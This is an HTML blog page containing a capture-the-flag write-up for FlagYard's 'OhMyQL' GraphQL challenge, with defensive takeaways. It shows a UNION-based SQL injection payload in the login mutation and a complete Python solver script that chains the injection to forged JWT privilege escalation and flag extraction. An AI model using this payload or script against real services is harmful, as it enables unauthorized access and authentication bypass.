@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>OhMyQL – [Web] (Hard) - FlagYard | m7eesn blog</title>
+<meta name="title" content="OhMyQL – [Web] (Hard) - FlagYard" />
+<meta name="description" content="Challenge Overview
+
+Category: Web (GraphQL)
+Difficulty: Hard
+Prompt: “Are you aware of modern web technologies?”
+Goal: Retrieve the FLAG exposed by the GraphQL-enabled web service.
+Download: download link
+
+The service exposes a GraphQL endpoint on /graphql, backed by a SQLite database and JSON Web Tokens (JWT) for authentication. A protected /admin HTTP route returns the flag, but only if the caller supplies a JWT whose payload includes {&quot;flagOwner&quot;: true}.
+
+Reconnaissance &amp; Source Review
+Static analysis of the application’s two back-end modules, app/app/index.js and app/app/database.js, reveals the entire execution flow:" />
+<meta name="keywords" content="" />
+
+
+<meta property="og:url" content="https://blog.looter.dev/blog/2025-10-24-flagyard-ohmyql-web-challenge/">
+  <meta property="og:site_name" content="m7eesn blog">
+  <meta property="og:title" content="OhMyQL – [Web] (Hard) - FlagYard">
+  <meta property="og:description" content="Challenge Overview Category: Web (GraphQL) Difficulty: Hard Prompt: “Are you aware of modern web technologies?” Goal: Retrieve the FLAG exposed by the GraphQL-enabled web service. Download: download link The service exposes a GraphQL endpoint on /graphql, backed by a SQLite database and JSON Web Tokens (JWT) for authentication. A protected /admin HTTP route returns the flag, but only if the caller supplies a JWT whose payload includes {&#34;flagOwner&#34;: true}.
+Reconnaissance &amp; Source Review Static analysis of the application’s two back-end modules, app/app/index.js and app/app/database.js, reveals the entire execution flow:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-10-24T17:40:00+00:00">
+    <meta property="article:modified_time" content="2025-10-24T17:40:00+00:00">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="OhMyQL – [Web] (Hard) - FlagYard">
+  <meta name="twitter:description" content="Challenge Overview Category: Web (GraphQL) Difficulty: Hard Prompt: “Are you aware of modern web technologies?” Goal: Retrieve the FLAG exposed by the GraphQL-enabled web service. Download: download link The service exposes a GraphQL endpoint on /graphql, backed by a SQLite database and JSON Web Tokens (JWT) for authentication. A protected /admin HTTP route returns the flag, but only if the caller supplies a JWT whose payload includes {&#34;flagOwner&#34;: true}.
+Reconnaissance &amp; Source Review Static analysis of the application’s two back-end modules, app/app/index.js and app/app/database.js, reveals the entire execution flow:">
+
+
+
+
+  <meta itemprop="name" content="OhMyQL – [Web] (Hard) - FlagYard">
+  <meta itemprop="description" content="Challenge Overview Category: Web (GraphQL) Difficulty: Hard Prompt: “Are you aware of modern web technologies?” Goal: Retrieve the FLAG exposed by the GraphQL-enabled web service. Download: download link The service exposes a GraphQL endpoint on /graphql, backed by a SQLite database and JSON Web Tokens (JWT) for authentication. A protected /admin HTTP route returns the flag, but only if the caller supplies a JWT whose payload includes {&#34;flagOwner&#34;: true}.
+Reconnaissance &amp; Source Review Static analysis of the application’s two back-end modules, app/app/index.js and app/app/database.js, reveals the entire execution flow:">
+  <meta itemprop="datePublished" content="2025-10-24T17:40:00+00:00">
+  <meta itemprop="dateModified" content="2025-10-24T17:40:00+00:00">
+  <meta itemprop="wordCount" content="934">
+  <meta itemprop="keywords" content="Ctf,Writeup,Flagyard">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+  code {
+    padding: 4px 8px !important;
+    margin: 0 4px !important;
+    background-color: rgba(0, 0, 0, 0.05);
+  }
+
+   
+  div.highlight {
+    background-color: rgba(15, 1, 1, 0.801);
+    border-radius: 3px;
+  }
+
+  div.highlight pre {
+    padding: 1em !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  div.highlight code {
+    padding: 0 !important;
+    margin: 0 !important;
+    background-color: transparent !important;
+    display: inline-block;
+    min-width: 100%;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    code {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    div.highlight {
+      background-color: rgba(0, 0, 0, 0.3);
+    }
+  }
+</style></head>
+
+<body>
+  <header><a href="https://blog.looter.dev/" class="title">
+  <h2>m7eesn blog</h2>
+</a>
+<nav>
+</nav>
+</header>
+  <main>
+
+<h1>OhMyQL – [Web] (Hard) - FlagYard</h1>
+<p>
+  <i>
+    <time datetime='2025-10-24'>
+      24 Oct, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <h2 id="challenge-overview">Challenge Overview</h2>
+<ul>
+<li><strong>Category:</strong> Web (GraphQL)</li>
+<li><strong>Difficulty:</strong> Hard</li>
+<li><strong>Prompt:</strong> “Are you aware of modern web technologies?”</li>
+<li><strong>Goal:</strong> Retrieve the <code>FLAG</code> exposed by the GraphQL-enabled web service.</li>
+<li><strong>Download:</strong> <a href="https://blog.looter.dev/downloads/flagyard-oh-my-qL.zip">download link</a></li>
+</ul>
+<p>The service exposes a GraphQL endpoint on <code>/graphql</code>, backed by a SQLite database and JSON Web Tokens (JWT) for authentication. A protected <code>/admin</code> HTTP route returns the flag, but only if the caller supplies a JWT whose payload includes <code>{&quot;flagOwner&quot;: true}</code>.</p>
+<hr>
+<h2 id="reconnaissance--source-review">Reconnaissance &amp; Source Review</h2>
+<p>Static analysis of the application’s two back-end modules, <code>app/app/index.js</code> and <code>app/app/database.js</code>, reveals the entire execution flow:</p>
+<ol>
+<li>
+<p><strong>Database access (<code>app/app/database.js:21</code>):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`SELECT * FROM users WHERE username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>;
+</span></span></code></pre></div><p>The <code>username</code> argument from GraphQL requests is interpolated directly into the SQL statement without sanitization or parameter binding, establishing a classic string-based SQL injection primitive.</p>
+</li>
+<li>
+<p><strong>GraphQL schema (<code>app/app/index.js</code>):</strong></p>
+<ul>
+<li><code>Query.getUser</code> and <code>Mutation.login</code> both call <code>db.getUser</code> with attacker-controlled usernames.</li>
+<li><code>Mutation.login</code> mints a JWT using the <em>same</em> <code>username</code> string received from the client:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">sign</span>({ <span style="color:#a6e22e">username</span> }, <span style="color:#a6e22e">JWT_SECRET</span>, { <span style="color:#a6e22e">expiresIn</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;6m&#39;</span> });
+</span></span></code></pre></div></li>
+<li><code>Mutation.setFlagOwner</code> requires an authenticated user and checks <code>user.username === username</code>. If the condition holds, it issues a second JWT embedding <code>flagOwner: true</code>.</li>
+<li>The <code>/admin</code> route trusts any presented JWT that decodes with <code>flagOwner === true</code> and returns <code>process.env.FLAG</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Authentication bypass strategy:</strong></p>
+<ul>
+<li>Because the injected SQL is reused as the JWT subject, we can forge tokens for arbitrary GraphQL “usernames” that never existed in the original database.</li>
+<li>By crafting a UNION-based payload that sets our own password inside the result-set, we satisfy the login mutation, receive a valid JWT, and subsequently satisfy the username equality check inside <code>setFlagOwner</code>.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="exploit-chain-walkthrough">Exploit Chain Walkthrough</h2>
+<p>The attack proceeds in three deterministic steps:</p>
+<ol>
+<li>
+<p><strong>SQL Injection via <code>login</code></strong></p>
+<ul>
+<li>Send a GraphQL mutation with <code>username</code> containing a UNION clause:<br>
+<code>&quot;' UNION SELECT 'attacker','pass123',1 -- &quot;</code></li>
+<li>When interpolated, the SQL becomes:<br>
+<code>SELECT * FROM users WHERE username = '' UNION SELECT 'attacker','pass123',1 -- '</code></li>
+<li>SQLite returns the fabricated row (<code>username=&quot;attacker&quot;</code>, <code>password=&quot;pass123&quot;</code>, <code>flagowner=1</code>).</li>
+<li>The password comparison succeeds because the attacker controls both the fabricated row and the password supplied to the mutation.</li>
+<li>The backend signs a JWT whose payload contains the malicious username string.</li>
+</ul>
+</li>
+<li>
+<p><strong>Privilege Escalation with <code>setFlagOwner</code></strong></p>
+<ul>
+<li>Using the first JWT, call the <code>setFlagOwner</code> mutation.</li>
+<li>The resolver re-verifies the JWT, sees the fabricated username, and (erroneously) believes the caller is acting on their own account.</li>
+<li>A new JWT is returned, this time including <code>{&quot;username&quot;: &quot;...payload...&quot;, &quot;flagOwner&quot;: true}</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Flag Extraction from <code>/admin</code></strong></p>
+<ul>
+<li>Supply the second JWT as an <code>Authorization: Bearer</code> header to <code>/admin</code>.</li>
+<li>Verification succeeds, the <code>flagOwner</code> check passes, and the server returns <code>process.env.FLAG</code>.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="solverpy"><code>solver.py</code></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BASE_URL: str <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;BASE_URL&#34;</span>, <span style="color:#e6db74">&#34;http://your_url.playat.flagyard.com&#34;</span>
+</span></span><span style="display:flex;"><span>)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GRAPHQL_URL: str <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/graphql&#34;</span>
+</span></span><span style="display:flex;"><span>ADMIN_URL: str <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/admin&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USERNAME_PAYLOAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; UNION SELECT &#39;attacker&#39;,&#39;pass123&#39;,1 -- &#34;</span>
+</span></span><span style="display:flex;"><span>PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pass123&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_graphql</span>(query: str, token: str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>) <span style="color:#f92672">-&gt;</span> dict:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Send a GraphQL query or mutation and return the decoded data block.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    headers: dict[str, str] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> token:
+</span></span><span style="display:flex;"><span>        headers[<span style="color:#e6db74">&#34;Authorization&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bearer </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Sending GraphQL query:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>query<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>        GRAPHQL_URL, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;query&#34;</span>: query}, headers<span style="color:#f92672">=</span>headers, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>raise_for_status()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;errors&#34;</span> <span style="color:#f92672">in</span> payload:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;GraphQL error: </span><span style="color:#e6db74">{</span>json<span style="color:#f92672">.</span>dumps(payload[<span style="color:#e6db74">&#39;errors&#39;</span>], indent<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload[<span style="color:#e6db74">&#34;data&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_with_injection</span>() <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    query: str <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mutation </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      login(username: &#34;</span><span style="color:#e6db74">{</span>USERNAME_PAYLOAD<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;, password: &#34;</span><span style="color:#e6db74">{</span>PASSWORD<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;) </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        token
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Logging in with SQL injection payload...&#34;</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> run_graphql(query)
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#34;login&#34;</span>][<span style="color:#e6db74">&#34;token&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Login step did not return a token.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">escalate_flag_owner</span>(token: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Use the attacker token to call setFlagOwner and receive a flagOwner token.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    query:str <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mutation </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      setFlagOwner(username: &#34;</span><span style="color:#e6db74">{</span>USERNAME_PAYLOAD<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Escalating privileges to flag owner...&#34;</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> run_graphql(query, token<span style="color:#f92672">=</span>token)
+</span></span><span style="display:flex;"><span>    flag_token <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#34;setFlagOwner&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> flag_token:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Flag escalation step failed.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flag_token
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_flag</span>(flag_token: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Call the admin endpoint with the flagOwner token and return the flag string.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    headers: dict[str, str] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Authorization&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bearer </span><span style="color:#e6db74">{</span>flag_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>}
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Reading flag from /admin endpoint...&#34;</span>)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(ADMIN_URL, headers<span style="color:#f92672">=</span>headers, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/admin returned </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#f92672">-&gt;</span> dict[str, str]:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Execute the full exploit chain and return both JWTs.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    access_token <span style="color:#f92672">=</span> login_with_injection()
+</span></span><span style="display:flex;"><span>    flag_token <span style="color:#f92672">=</span> escalate_flag_owner(access_token)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;access&#34;</span>: access_token,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;flag&#34;</span>: flag_token,
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>() <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        tokens <span style="color:#f92672">=</span> exploit()
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Access token:&#34;</span>, tokens<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;access&#34;</span>))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Flag token:&#34;</span>, tokens<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;flag&#34;</span>))
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, read_flag(tokens<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;flag&#34;</span>)))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> (<span style="color:#a6e22e">Exception</span>, requests<span style="color:#f92672">.</span>RequestException) <span style="color:#66d9ef">as</span> exc:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Exploit failed: </span><span style="color:#e6db74">{</span>exc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><hr>
+<h2 id="defensive-takeaways">Defensive Takeaways</h2>
+<ol>
+<li><strong>Parameterize SQL queries:</strong> Replace string interpolation with prepared statements, e.g.<br>
+<code>db.get('SELECT * FROM users WHERE username = ?', [username])</code>.</li>
+<li><strong>Sanitize GraphQL input:</strong> Layer validation on resolver arguments to restrict characters where appropriate.</li>
+<li><strong>Decouple authentication from raw input:</strong> Never embed untrusted strings directly into JWT payloads or privilege checks. Use canonical identifiers fetched from trusted storage.</li>
+<li><strong>Least privilege claims:</strong> <code>setFlagOwner</code> should check server-side state (e.g., a database column), not trust the caller’s JWT subject.</li>
+</ol>
+<p>By closing any single link in the chain above, the exploit path collapses and the flag remains protected. This challenge demonstrates how small oversights SQL injection in ORM-like helper functions and trust in JWT fields can combine into a critical compromise.</p>
+<hr>
+<h2 id="conclusion">Conclusion</h2>
+<p>OhMyQL strings together well-known mistakes-string-concatenated SQL, insecure GraphQL resolvers, and overly trusting JWT validation into a textbook privilege escalation. Once the SQL injection is identified, every subsequent step becomes a matter of replaying that tainted input through the business logic. The solver script demonstrates how little effort is needed to weaponize the flaw, underscoring why defense-in-depth (parameterized queries, strong input validation, claim minimization) remains crucial even in “modern” stacks that sit on top of traditional databases. Fixing any one component would block the attack; fixing them all restores confidence that the admin flag stays secret.</p>
+
+</content>
+
+
+
+<p>
+  
+</p>
+
+  </main>
+  <footer></footer>
+
+  
+</body>
+
+</html>
